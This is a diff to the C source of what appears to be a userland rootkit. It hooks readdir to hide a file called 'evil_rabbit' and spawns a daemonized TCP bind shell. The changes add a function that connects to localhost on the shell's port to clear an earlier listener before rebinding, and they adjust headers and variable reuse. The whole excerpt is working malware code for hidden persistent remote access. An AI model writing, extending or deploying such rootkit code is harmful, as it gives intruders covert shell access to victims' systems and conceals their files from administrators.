@@ -21,8 +21,11 @@
 #include <dirent.h>
 #include <sys/socket.h>
 #include <sys/types.h>
-#include <netinet/ip.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <unistd.h>
+
+#include <errno.h>
 
 
 #define HIDE_FILE  "evil_rabbit"
@@ -33,6 +36,28 @@
 static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
 static int PEACE_FLAG = 0;
 
+
+// Returns 1 if the a process listens on PORT and 0 otherwise. It results into termination of server
+// process if it is able to establish a connection with the server process.
+int closeExistingConnection()
+{
+	int client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	struct sockaddr_in hostConfig;
+
+	// Clearing out hostConfig structure and adding server configuration.
+	memset(&hostConfig, 0, sizeof(struct sockaddr_in));
+	hostConfig.sin_family = AF_INET;
+	hostConfig.sin_port = htons(PORT);
+	hostConfig.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+	// Connect to server (localhost:PORT)
+	int val = connect(client_sockfd, (struct sockaddr *) &hostConfig, sizeof(hostConfig));
+	if (val == 0){
+		close(client_sockfd);
+		return 1;
+	}
+	else	return 0;
+}
 
 
 // Create a TCP Bind shell
@@ -51,6 +76,10 @@ void peace()
 
 	if (pid == 0)
 	{
+		// Close existing connection and wait for 2 seconds to prevent bind errors
+		int status = closeExistingConnection();
+		sleep(2);
+
 		// Daemonize the TCP bind shell
 		daemon(0,1);
 
@@ -62,9 +91,9 @@ void peace()
 		int sockfd = socket(AF_INET, SOCK_STREAM, 0);		// <1>
 		if (sockfd == -1) return;
 
-		int status = bind(sockfd, (struct sockaddr *) &socketConfig, sizeof(socketConfig));		// <2>
+		status = bind(sockfd, (struct sockaddr *) &socketConfig, sizeof(socketConfig));		// <2>
 		if (status == -1) return;
-
+		
 		status = listen(sockfd, 0);			// <3>
 		if (status == -1) return;
 
